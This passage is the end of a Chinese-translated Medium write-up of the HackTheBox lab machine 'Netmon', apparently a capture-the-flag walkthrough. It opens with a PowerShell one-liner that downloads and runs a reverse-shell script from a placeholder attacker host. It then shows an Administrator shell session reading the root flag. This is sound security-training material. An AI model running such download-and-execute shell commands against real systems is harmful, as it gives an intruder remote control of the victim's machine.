IEX(New-Object Net.WebClient).downloadString('http://attackerip:8000/Invoke-PowerShellTcp.ps1')</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nf"><img src="../Images/ad0946c6668b6bcc565e823ff6479c42.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CKR8DnqIqUFZgYjckoE8wA.png"/></div></div></figure><p id="4dfb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们得到了我们的壳。</p><p id="90e5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">转到C:\Users\Administrator\Desktop，我们现在可以读取root.txt。</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="3437" class="mg kn iq mc b gy mh mi l mj mk">PS C:\Users\Administrator&gt; cd Desktop<br/>PS C:\Users\Administrator\Desktop&gt; dir</span><span id="568d" class="mg kn iq mc b gy mq mi l mj mk">Directory: C:\Users\Administrator\Desktop</span><span id="cfee" class="mg kn iq mc b gy mq mi l mj mk">Mode                LastWriteTime         Length Name                                                                            <br/>----                -------------         ------ ----                                                                            <br/>-a----         2/2/2019  11:35 PM             33 root.txt</span><span id="2137" class="mg kn iq mc b gy mq mi l mj mk">PS C:\Users\Administrator\Desktop&gt; pwd</span><span id="baf3" class="mg kn iq mc b gy mq mi l mj mk">Path<br/>----<br/>C:\Users\Administrator\Desktop</span><span id="b184" class="mg kn iq mc b gy mq mi l mj mk">PS C:\Users\Administrator\Desktop&gt; type root.txt<br/><strong class="mc ir">3018977fb9..</strong><br/>PS C:\Users\Administrator\Desktop&gt;</span></pre><p id="b81d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这就是我如何从黑盒子里做盒子Netmon的。我希望你能从这次演练中学到一些东西。干杯！🍺</p></div><div class="ab cl ng nh hu ni" role="separator"><span class="nj bw bk nk nl nm"/><span class="nj bw bk nk nl nm"/><span class="nj bw bk nk nl"/></div><div class="ij ik il im in"><p id="d49d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nn">关注</em> <a class="ae kl" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="nn"> Infosec报道</em> </a> <em class="nn">获取更多此类精彩报道。</em></p><div class="mr ms gp gr mt mu"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="mv ab fo"><div class="mw ab mx cl cj my"><h2 class="bd ir gy z fp mz fr fs na fu fw ip bi translated">信息安全报道</h2><div class="nb l"><h3 class="bd b gy z fp mz fr fs na fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="nc l"><p class="bd b dl z fp mz fr fs na fu fw dk translated">medium.com</p></div></div><div class="no l"><div class="np l nq nr ns no nt lv mu"/></div></div></a></div></div></div>    
</body>
</html>